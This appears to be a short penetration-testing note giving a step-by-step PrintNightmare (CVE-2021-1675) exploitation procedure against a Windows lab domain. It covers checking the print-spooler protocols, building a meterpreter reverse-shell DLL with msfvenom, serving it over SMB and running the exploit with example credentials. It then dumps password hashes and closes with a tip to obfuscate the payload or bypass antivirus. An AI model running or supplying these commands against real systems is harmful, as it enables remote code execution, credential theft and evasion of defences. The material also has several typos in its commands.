```sh
# CHeck if the host is vulnerable
rpcdump.py @<victim IP: 192.168.1.10> | egrep 'MS-RPRN|MS-PAR'

# Vulnerable if below is the output
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

### Configuration

```sh
# we have to install the particular version of impacket specified by cube0x0
> pip3 unistall impacket
> git clone https://github.com/cube0x0/impacket
> python3 ./setup.py install

```

```sh
# we need to have a dll file.
# use msfvenom create the payload
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attackermachineIP> LPORT=<5555> -f dll > shell.dll
# shell payload is done

# get a listener suing msfconsole
> use multi/handler
> options
> set payload windows/x64/meterpreter?reverse_tcp
> set lport 5555
> set lhost <attackerIP> 
> run

# we have to share the payload shell file 
# Setup an smb file share server using smbserver module of impacket
# navigate to shell payload folder and start share
> smbserver.py share 'pwd' -smb2support

# clone the CVE Execution file from git.
> python3 CVE-2021-1675.py < <domain/username:password@IP Address>: marvel.local/fcastle:Password1@192.168.138.132 < '<\\attackerIP\<sharename>\<shellpayload.dll>': '\\192.168.138.128\share\shell.dll'>

# A meterpreter session will be spawned in the multi handler
> getuid
> hashdump


# better obfuscate the dll payload file or use some AV Bypass methods to have better success.+++-
```




References: 
https://github.com/cube0x0/CVE-2021-1675
https://github.com/calebstewart/CVE-2021-1675